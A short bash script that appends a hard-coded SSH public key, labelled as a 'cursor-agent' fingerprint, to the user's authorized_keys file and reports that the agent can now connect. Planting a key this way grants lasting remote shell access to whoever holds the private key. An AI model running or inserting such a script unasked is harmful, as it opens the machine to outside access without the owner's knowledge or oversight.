#!/bin/bash
set -euo pipefail
mkdir -p ~/.ssh
chmod 700 ~/.ssh
PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPaUAf6QzEPyaV6Z/HOViebBoQFNc02ghSXqVxPWhnQe cursor-agent-fingerprint@vPC'
touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
grep -qxF "$PUB" ~/.ssh/authorized_keys || echo "$PUB" >> ~/.ssh/authorized_keys
echo "Key installed. Agent can now connect."